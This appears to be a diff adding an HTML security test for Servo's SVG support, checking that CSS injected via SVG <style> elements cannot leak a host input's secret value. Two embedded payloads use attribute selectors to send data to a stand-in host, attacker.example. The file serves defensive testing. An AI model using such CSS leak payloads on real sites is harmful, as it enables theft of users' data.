@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Layer 2 — CSS injection guard (attribute-selector leak)</title>
+</head>
+<body>
+
+<!-- Host secret data that an attacker's SVG must NOT be able to read. -->
+<input id="secret" value="SUPERSECRET">
+
+<!--
+  Vector A: <style> directly inside <svg>.
+  The parser creates this as a plain SVGElement (NOT an HTMLStyleElement), so
+  it is never registered as a document stylesheet — the rule below never
+  cascades to the host <input>. The only parser that touches it is servo-svg's
+  own class-only collector, which ignores `input[value^=...]`.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
+  <style>
+    input[value^="S"] { background: url(https://attacker.example/?leak=S); }
+  </style>
+  <rect x="0" y="0" width="200" height="60" fill="green"/>
+</svg>
+
+<!--
+  Vector B: <style> inside <foreignObject> DOES become a real HTMLStyleElement
+  and would cascade document-wide. The servo-svg guard in htmlstyleelement.rs
+  skips its registration when layout_servo_svg_enabled is on, closing the leak.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
+  <foreignObject width="200" height="60">
+    <style>
+      input[value^="S"] { background: url(https://attacker.example/?leak=S); }
+    </style>
+  </foreignObject>
+  <rect x="0" y="0" width="200" height="60" fill="blue"/>
+</svg>
+
+<!--
+  Expected: the <input> keeps its default background and no request to
+  attacker.example is ever made. Run with:
+    ./target/debug/servoshell.exe -z --window-size=400x200 -o out.png \
+      file:///D:/Projects/svg-tests/security/layer2_css_injection.html \
+      --pref layout_servo_svg_enabled
+-->
+</body>
+</html>
